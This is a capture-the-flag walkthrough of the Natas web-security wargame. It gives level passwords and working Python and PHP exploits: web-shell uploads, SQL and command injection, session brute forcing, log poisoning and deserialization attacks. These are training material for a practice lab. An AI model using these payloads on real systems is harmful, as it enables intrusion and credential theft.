LEVEL 0

g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 

LEVEL 01

ctrl + u
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 

LEVEL 02

view-source:http://natas2.natas.labs.overthewire.org/files/
users.txt
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

LEVEL 03

http://natas3.natas.labs.overthewire.org/robots.txt
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

LEVEL 04

use burp suite and click index.php
to modify the referer and sen it to the repeater and click send
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

LEVEL 05

have to change logged in to - 1
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

or in brave browser you can go to inspect -> application -> cookie -> loggedin change it to 1


LEVEL 06

http://natas6.natas.labs.overthewire.org/includes/secret.inc
FOEIUWGHFEEUHOFUOIU
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

LEVEL 07

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

LEVEL 08

bin2hex(strrev(base64_encode($secret))); - THIS IS THE ENCODING PROCESS YOU NEED TO DO IT IN OPPOSITE WAY TO DECODE.
IN LINUX TERMINAL YOU CAN DECODE THE CODE
php -a
php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
oubWYf2kBq
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

LEVEL 09

in this level if you didn't enter the ";" it doesn;t consider as a command.

test; ls ../../../../
; ls ../../../../
; ls ../../../../etc
; ls ../../../../etc/natas_web_pass
; ls ../../../../etc/natas_web_pass/natas10

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

LEVEL 10

it doesn't work like the previous one it works with a letter ( i tried a, l, o, u because grep doesn't care about the uppercase it will search eventually...)
a /etc/natas_webpass/natas11
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg


LEVEL 11

MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D - this is the cookie

in here cipher text ^ key = plain text (if you have any of these two you can get remain one)
use cyberchef web page paste the cookie and select from base 64 and you will get the cipher text
after that prss the button that replace with input output and copy it and pate it on XOR UTF-8 then you will get the key.
then you change {"showpassword":"yes","bgcolor":"#ffffff"} this and pase it to input and to XOR give the key and drag 'to base 64' you will get the new cookie.

you need to get the key 

XOR plain text ^ Cipher text = Key

Cipher text - 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67

Plain text - {"showpassword":"no","bgcolor":"#ffffff"}

Key - KNHL

Then you can get the new cookie and paste it on the browser and get the password for natas12.

new cookie - MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz

password for natas 12 - YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG



Level 12


In this level there is an interface to upload a file and if you look the source code you can fine a php code with some functions that had been defined. 

I watched walk through and I used sublime text editor to write a puthon code and execute it.
first create a file and save it. 
when we run this code we get a out put and when we look in to it we can see it generates some random strings with jpg extension so we cannot execute that, hence we need to ceate a python file an cat it out.
once you executed the code you can get the path of the php file.
?c=cat id
?c=cat whoami
you can see it gives some out put the we can get the password by giving the following path as earlier levels.
?c=cat /etc/natas_webpass/natas13


#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
#response = session.post(url, files = {"uploadedfile" : open('revshell.php', 'rb')},data = {"filename":"revshell.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password))
response = session.get(url + 'upload/ltnw8gq53g.php?c=cat /etc/natas_webpass/natas13', auth = (username, password))


content = response.text
print(content)

this is the php get request, c is just a variable 

<?php

	system($_GET['c']);

?>


lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9


Level 13

Same code as level 12 but slight different that we cannot upload our php file because of they change their php code with exif_imagetype function it checks whether is it a image file type or not, But there is always a way to go through it is that this function "exif_imagetype()" reads the first bytes of an image and checks its signature. Therefore we can change it to look as GIF or an image.
Actully we are tricking the web server that we are going to upload a GIF but truly we are uploading a php code.

GIF89a
<?php

	system($_GET['c']);

?>

we modify the code and check file type then we will get the file as a GIF

file revshell.php
revshell.php: GIF image data, version 89a, 15370 x 28735

Now we execute the code and getting the path as previous level

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
response = session.post(url, files = {"uploadedfile" : open('revshell.php', 'rb')},data = {"filename":"revshell.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password))


content = response.text
print(content)

path - upload/85b22dghpf.php
upload/85b22dghpf.php?c=whoami - check whoami and confirm it you can now easily get the password by using cat /etc/natas_webpass/natas14

qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP


Level 14

In this level we are going to trick the backend code and inject a sql query.

First of all we need to focus on the sql query we don't know any usernames or passwords but we can do something to this.
we just need to get username and password = true for that first of all we can comment out the password part and begin with username but we don't know any users either hence we need to write a statement that is true always. For that we can write putting a OR and 1 = 1, it's always true. Now you can execute the code and get the password.

when we comment the password:
Executing query: SELECT * from users where username="shenal" 	#" and password="mario"<br>Access denied!<br><div id="viewsource">
still we doen't have access because we don't know the username.

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
response = session.post(url, data = {"username" : 'shenal" OR 1 = 1	#', "password" : "mario"}, auth=(username, password))

content = response.text
print(content)


TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB


Level 15

in this level we try to enter another sql injection but in a different way.
response = session.post(url, data = {"username" : "shenal"},auth=(username, password))
this doesn't work hence we enter username as 'natas16' it will work.

this quey tells us that user exist.
response = session.post(url, data = {"username" : 'natas16"  #'},auth=(username, password))

this shows: This user doesn't exist.
response = session.post(url, data = {"username" : 'natas16" password LIKE "whoknows" #'},auth=(username, password))

We call this method as blind SQl injection.


import requests
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth=(username, password))

seen_password = list()
while True:
    for ch in characters:
        print("trying with password", "".join(seen_password) + ch)
        response = session.post(
            url,
            data={
                "username": 'natas16" AND password LIKE BINARY "' +"".join(seen_password) + ch + '%" #'
            }, auth=(username, password)
        )
        
        content = response.text
        
        if "This user exists." in content:
            seen_password.append(ch)
            break
        
    print("Current password:", "".join(seen_password))

    # Add a condition to exit the loop when the password length is reached
    if len(seen_password) == len(password):
        print("Password found:", "".join(seen_password))
        break



when you got the password it will keep iterating there are 32 characters after that you wont get any characters but it will keep iterating.

trd7izrd5gatjj9pkpeuaolfejhqj32v
TRD7IZRD5GATJJ9PKPEUAOLFEJHQJ32V

this is not the password but if you  change this line like this I mean first you need to give uppercase then the lowercase.
characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
otherwise it will print letters in lowercase. On the other hand it will only print uppercase and digits because it' not checking case sensitive. correct code is above.

TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V


Level 16

In this level it's like a previous level dictionary.txt file search. Related to natas 16 any output will not shown because of the 'grep'
We have to do some sql injection and do a bruforce to get the password as earlier level.

<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>

response = session.post(url, data = {"needle" : "'ls'"}, auth=(username, password))
this says illegal character

response = session.post(url, data = {"needle" : "($whoami)"}, auth=(username, password))
this will not give any output
in here we are trying to use that we used in the previous leve user does exist or not kind of a thing. like an answer (yes or no)

response = session.post(url, data = {"needle" : "($ /etc/natas_webpass/natas17)"}, auth=(username, password)) - no output

response = session.post(url, data = {"needle" : "$(grep b /etc/natas_webpass/natas17)"}, auth=(username, password)) - a is not in the password when you type b it will not give you a out put because b is in the pass word in  PHP grep it doesn't search for b in dictionary.txt

response = session.post(url, data = {"needle" : "anythings$(grep a /etc/natas_webpass/natas17)"}, auth=(username, password))
returns anythings it means a letter is not in the password

response = session.post(url, data = {"needle" : "anythings$(grep b /etc/natas_webpass/natas17)"}, auth=(username, password))
does not returns anythings it means b letter is in the password

now we got the yes or no thing.....
we need to get every character in the password.

response = session.post(url, data = {"needle" : "anythings$(grep ^b /etc/natas_webpass/natas17)"}, auth=(username, password))
we are trying to find the what is the first character.

#python_code

from urllib import response
import urllib
import requests
import re
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
passwd = list()

username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
            

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
passwd = ''
oldlenght = 0
passwordLeaked = ''

    

while len(passwd) < 32:
    for char in characters:
        print('Trying password :', ''.join(passwd)+char)
        reponse = session.post(url , data={"needle":"anythings$(grep ^"+''.join(passwd)+char+" /etc/natas_webpass/natas17)"}, auth=(username, password))
        content = reponse.text
        
        if not re.findall('anythings',content):
            passwd += char
            break
        
    #for char in passwd[0:oldlenght]:
        #passwordLeaked += char
print('The password is :', passwd)


#$(grep b /etc/natas_webpass/natas17)



XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

Level 17

In this level also we are going to do a sql injection (time-based blind SQL injection )

response = session.post(url, data = {"username" : 'shenal" OR 1 = 1 #'}, auth=(username, password))
no output 

now we are going to try the SQL sleep function
response = session.post(url, data = {"username" : 'shenal" AND SLEEP(5) #'}, auth=(username, password))
no out put because there is no such an user therfore enter 'natas18'

response = session.post(url, data = {"username" : 'natas18" AND SLEEP(5) #'}, auth=(username, password))

now we can do a time base attack

response = session.post(url, data = {"username" : 'natas18" AND password LIKE "' + "".join(seen_password) + character + '%" AND SLEEP(2) #'}, auth=(username, password))

we can clearly see it sleeps 
trying 8
end_time  1693144260.9159546 and difference  2.2369472980499268 - (sleep)
start_time 1693144260.9160337
Make sure to use BINARY otherwise you may lost capital letters in the password.

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
from time import time, sleep

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

seen_password = ''
while len(seen_password) < 32:
    character_found = False

    for character in characters:
        start_time = time()


        print("trying ", ''.join(seen_password + character))
        payload = 'natas18" AND password LIKE BINARY "' + seen_password + character + '%" AND SLEEP(2) #'
        data = {'username': payload}
        
        response = session.post(url, data=data, auth=(username, password))
        end_time = time()

        difference = end_time - start_time

        if difference > 2:  # Adjust the threshold as needed
            seen_password += character
            character_found = True
            #seen_password.append(character)
            break

    if not character_found:
        print("Character not found. Exiting.")
        break

print('The password is:', seen_password)


The password is: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq





Level 18

in this level we cannot get an idea like yes or no

response = session.post(url, data = {"username": "shenal", "password" : "mario"}, auth = (username, password))
not works

#print(content)
print(session.cookies)

PHPSESSID=13
A PHP session ID is a unique identifier assigned to each user's session in a web application built with PHP. It allows the server to track and manage user sessions. Sessions are a way to store user-specific data across multiple pages or requests, making it possible to maintain stateful interactions on an otherwise stateless HTTP protocol.

Now we need to try to get the admins session id therefore, We are doing a bruteforce.

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
from time import time, sleep

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#seen_password = ''

for session_id in range(1,641):
    response = session.get(url, cookies = {"PHPSESSID" : str(session_id)}, auth = (username, password))
    #response = session.post(url, data = {"username": "natas19", "password" : "mario"}, auth = (username, password))
    content = response.text
    if "You are an admin" in content :
        print("Got it!", session_id)
        print(content)
        break
    else:
        print("Trying : ", session_id)

#print(session.cookies)


Got it! 119

Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s




Level 19


In this level page uses the same code but no session id

response = session.post(url, data = {"username": "shenal", "password" : "mario"}, auth = (username, password))
no output (no progress)

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
#response = session.get(url, cookies = {"PHPSESSID" : str(session_id)}, auth = (username, password))
response = session.post(url, data = {"username": "shenal", "password" : "mario"}, auth = (username, password))
content = response.text

print(session.cookies)  
print("=======================")
print(content)


it gives me : PHPSESSID=3137332d7368656e616c (random number that change)

3633392d7368656e616c
3530332d7368656e616c
36342d7368656e616c
3230382d7368656e616c
39322d7368656e616c


remove the user name and try it then you will get some id but the end of '2d' wont change

3532302d
3333332d

These are hex values

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

url = 'http://%s.natas.labs.overthewire.org/' % username

for i in range(10):

    session = requests.Session()

    #response = session.get(url, auth=(username, password))
    #response = session.get(url, cookies = {"PHPSESSID" : str(session_id)}, auth = (username, password))
    response = session.post(url, data = {"username": "shenal", "password" : "mario"}, auth = (username, password))
    content = response.text

    #print(session.cookies["PHPSESSID"].decode('hex'))
    print(bytes.fromhex(session.cookies["PHPSESSID"]).decode('utf-8'))

these are the out put:
293-shenal
544-shenal
543-shenal
226-shenal
366-shenal
346-shenal
638-shenal
262-shenal
548-shenal
344-shenal

Difference between this level and the previous one is in here we need to fine admins session id with decoding.


this is the code:

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

url = 'http://%s.natas.labs.overthewire.org/' % username

for i in range(641):

    session = requests.Session()
    
    hex_encoded_session_id = "%d-admin" % i
    print("Trying PHPSESSID:", hex_encoded_session_id.encode('utf-8').hex())

    cookies = {"PHPSESSID": hex_encoded_session_id.encode('utf-8').hex()}
    response = session.get(url, cookies=cookies, auth=(username, password))

    #response = session.get(url, auth=(username, password))
    #response = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('hex')}, auth = (username, password))
    #response = session.post(url, data = {"username": "shenal", "password" : "mario"}, auth = (username, password))
    content = response.text

    if "You are an admin" in content :
        print("Got it!!", i)
        print(content)
        break
        
    


    #print(session.cookies["PHPSESSID"].decode('hex'))
    #print(bytes.fromhex(session.cookies["PHPSESSID"]).decode('utf-8'))
    

Got it!! 281
Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH


Level 20


In this level there are custom php functions

<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */


function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}


Now we are writing the python code

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()


response = session.post(url, data = {"name": "shenal\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)

response = session.post(url, data = {"name": "shenal\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)

response = session.post(url, data = {"name": "shenal\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)


in the third time session will be deleted.

89OWrTkGmiLZLv12JY4tLj2c4FW0xn56


******* with the burp suite ********

http://natas20.natas.labs.overthewire.org/?debug

DEBUG: MYREAD vm7lfeq4rm4qcikpa79au0dvsj
DEBUG: Reading from /var/lib/php/sessions/mysess_vm7lfeq4rm4qcikpa79au0dvsj  - (this is the path where it saves)
DEBUG: Read []

now you can see it does two thing write and read


asdf%250Aid%25250Aasdf
asdf%25id%25asdf
what happen is %25 this will bw removed and print lines

asdf
id
asdf

%0Aadmin 1
and in repeater send it two times, third time session will be deleted.


POST /index.php HTTP/1.1
Host: natas20.natas.labs.overthewire.org
Content-Length: 15
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==
Upgrade-Insecure-Requests: 1
Origin: http://natas20.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas20.natas.labs.overthewire.org/?debug
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=vm7lfeq4rm4qcikpa79au0dvsj
Connection: close

name=%0Aadmin 1


89OWrTkGmiLZLv12JY4tLj2c4FW0xn56




Level 21

 to command many lines at a time ctrl + /

if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

it stores in the session this seems to be the vulnerability

# url = 'http://%s.natas.labs.overthewire.org/' % username
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1'

experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'

[DEBUG] Session contents:<br>Array
(
    [debug] => true
    [submit] => 1
    [admin] => 1
)

print(session.cookies["PHPSESSID"])
uv9e59pkrpleooa9gd13mmhbbo

getting the original session setup and stealing the cookie from experimenter page and post it to the First page and pass it alone with the cookies

get and post both works

91awVM9oDiUGm33JdzM7RVLBS8bz9n0s


Level 22


#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas22'
password = '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s'

url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % username

session = requests.Session()

response = session.get(url, auth=(username, password), allow_redirects = False)


content = response.text
print(content)



allow_redirects is set to False, the script will not follow any redirects that may occur in the response, and the response content will reflect the initial response.

qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj




Level 23


<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  

php doesn't consider the variable type

response = session.post(url, data = { "passwd" : "iloveyou" },auth=(username, password)) 
this gives us wrong

response = session.post(url, data = { "passwd" : "10iloveyou" },auth=(username, password))
response = session.post(url, data = { "passwd" : "iloveyou11" },auth=(username, password))
it doesn't work like this either.
10 doesn't work because not greater than 10 it's equal therefore the code is :

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas23'
password = 'qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth=(username, password))
response = session.post(url, data = { "passwd" : "11iloveyou" },auth=(username, password))

content = response.text
print(content)

0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r



Level 24

PHP type juggling

strcmp - compares strings

The function takes two string arguments, $str1 and $str2, and returns an integer:

If the two strings are equal, strcmp returns 0.
If $str1 is greater than $str2, strcmp returns a positive integer.
If $str1 is less than $str2, strcmp returns a negative integer.

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 

we are not going to make it a strig we are going to make it an array

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas24'
password = '0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth=(username, password))
response = session.post(url, data = { 'passwd[]' : 'shenal' }, auth=(username, password))


content = response.text
print(content)

O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx



Level 25

Consider this we dont know the exactly how many brancher up there
some how we need to get the password.

response = session.post(url, data = {"lang" : "../../../../../../etc/passwd"}, auth=(username, password))
no any clear idea.

consider this python code,

>>> '../'.replace('../','')
''
>>> '..././'.replace('../','')
'../'

it combine with the remaining one so we can use that.

response = session.post(url, data = {"lang" : "..././..././..././..././..././..././etc/passwd"}, auth=(username, password))

now we are getting access for the file that are being hidden so far.

Now we need to read the log for that we need the session id hence we findout the cookies,

41c4lmbjk5rg38imolaner24cb - cookie

response = session.post(url, data = {"lang" : "..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + session.cookies['PHPSESSID'] + ".log"}, auth=(username, password))

Now it shows "Directory traversal attempt! fixing request."

We can control that what the HTTP user agent is, we can modufy the http header.

In php we can run shell commands therfore,

headers = {"User-Agent" : "<?php system( 'cat /etc/natas_webpass/natas26' ); ?>"}

we are injecting this into the log entry.

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas25'
password = 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

headers = {"User-Agent" : "<?php system( 'cat /etc/natas_webpass/natas26' ); ?>"}

response = session.get(url, auth=(username, password))
print(session.cookies['PHPSESSID'])
response = session.post(url, headers = headers, data = {"lang" : "..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + session.cookies['PHPSESSID'] + ".log"}, auth=(username, password))


content = response.text
print(content)


8A506rfIAXbKKk68yJeuTuRq4UfcK70k



Level 26


There is little bit object oriented programing in the source code (classes)
PHP object manipulation with desereialize

response = session.get(url + '?x1=0&y1=0&x2=500&y2=500', auth=(username, password))
print(session.cookies['PHPSESSID'])

<img src="img/natas26_ppr79j6ojc3hlk2s4eqqbmbqh7.png">
ppr79j6ojc3hlk2s4eqqbmbqh7

it usese same cookie as the path


response = session.get(url, auth=(username, password))
content = response.text
print(content)
print(session.cookies)

response = session.get(url + '?x1=0&y1=0&x2=500&y2=500', auth=(username, password))
content = response.text
print(content)
print(session.cookies)

output:
<RequestsCookieJar[<Cookie PHPSESSID=4rnbqfhplc78puc2baqskofpht for natas26.natas.labs.overthewire.org/>, <Cookie drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiI1MDAiO3M6MjoieTIiO3M6MzoiNTAwIjt9fQ%3D%3D for natas26.natas.labs.overthewire.org/>]>


print(unquote(session.cookies['drawing']))
print(base64.b64decode(unquote(session.cookies['drawing'])))

b'a:1:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"500";s:2:"y2";s:3:"500";}}'

php serealized data

we can change class logger variables and then it will deserialize 


************************ without python ***************************

serialization - deviding complex object into separate parts

firewall cannot identify special characters therefore it will drop hence we need to encode the url

serialization and deserialization happens in the server

in here user can control the cookie and manipulate the image it's a huge vunerability




type something on text boxes and dra some kine and get the drawing cookie
go to cyber chef
url decode
and drag the from base 64
you get a php serialized object (server will deserialize it)
now flip it and choose a one part and erase other parts (we need only a one part it has more that one same thing)
replace input with output
we only need one value so set 13 -> 1
Now to base 64 and url encode (enable special characters)

<?php
    class Logger{
        private $logFile;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas26'); ?>";
            $this->logFile = "img/shenal.php"; 
        }
    }

    $object = new Logger();
    echo base64_encode(serialize($object));



?>

execute and get the cookie after that paste it on the drawing cookie
it reads/deserialize our code but it cannot understand the types

img/shenal.php - add this path to the url

http://natas26.natas.labs.overthewire.org/img/shenal.php

you'll catch the password

8A506rfIAXbKKk68yJeuTuRq4UfcK70k 

